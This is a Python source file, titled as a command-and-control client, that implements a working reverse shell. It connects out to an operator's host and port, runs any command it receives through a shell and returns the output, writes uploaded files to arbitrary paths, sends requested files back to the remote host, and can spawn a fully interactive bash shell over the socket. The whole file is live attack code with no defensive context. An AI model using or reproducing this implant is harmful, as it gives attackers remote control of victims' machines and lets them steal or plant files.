"""
Project #17: Interactive C2 Client Endpoint
Architecture: Multipurpose Inline Stream Multiplexing + PTY Shell Allocation.
"""

import socket
import sys
import subprocess
import os
import base64

def execute_pty_upgrade(s):
    """Forks the process context into a full Unix interactive master/slave pseudoterminal."""
    try:
        import pty
        # Redirect standard streams explicitly into the active duplex network socket file descriptor
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Spawn a fully interactive system shell back up the wire
        pty.spawn("/bin/bash")
    except Exception as e:
        s.sendall(f"ERROR: PTY allocation failed: {e}\n".encode('utf-8'))

def process_inbound_stream(host_ip, host_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((host_ip, host_port))
    except Exception as e:
        sys.exit(1)

    while True:
        try:
            raw_data = client.recv(1024 * 64)
            if not raw_data:
                break
                
            cmd_str = raw_data.decode('utf-8', errors='ignore').strip()
            
            if not cmd_str:
                continue

            # --- MULTIPLEX MATRIX: HANDLE CONTEXT INSTRUCTIONS ---
            if cmd_str.startswith("__UPLOAD__:"):
                # Protocol Layout: __UPLOAD__:<remote_path>:<base64_data>
                _, r_path, b64_payload = cmd_str.split(":", 2)
                try:
                    file_bytes = base64.b64decode(b64_payload)
                    with open(r_path, "wb") as f:
                        f.write(file_bytes)
                    client.sendall(f"[SUCCESS] Remote file written cleanly to path: {r_path}\n".encode('utf-8'))
                except Exception as e:
                    client.sendall(f"[ERROR] Asset creation sequence failed: {e}\n".encode('utf-8'))
                continue

            elif cmd_str.startswith("__DOWNLOAD__:"):
                # Protocol Layout: __DOWNLOAD__:<remote_path>
                _, r_path = cmd_str.split(":", 1)
                if os.path.exists(r_path):
                    try:
                        with open(r_path, "rb") as f:
                            content = f.read()
                        encoded_str = base64.b64encode(content).decode('utf-8')
                        client.sendall(encoded_str.encode('utf-8') + b"\n")
                    except Exception:
                        client.sendall(f"ERROR: Read permissions denied for {r_path}\n".encode('utf-8'))
                else:
                    client.sendall(f"ERROR: File path target does not exist on node system.\n".encode('utf-8'))
                continue

            elif cmd_str == "interactive":
                client.sendall(b"[*] Spawning PTY terminal structure... Drop into bash layout shell below:\n")
                execute_pty_upgrade(client)
                # Once the PTY stream exits, break out of this communication cycle safely
                break

            elif cmd_str == "exit":
                break

            # Default Standard Shell Command Routing
            proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            output = stdout + stderr
            
            if not output:
                output = b"\n"
            client.sendall(output)
            
        except Exception:
            break

    client.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 reverse_client.py <server_ip> <server_port>")
        sys.exit(1)
        
    process_inbound_stream(sys.argv[1], int(sys.argv[2]))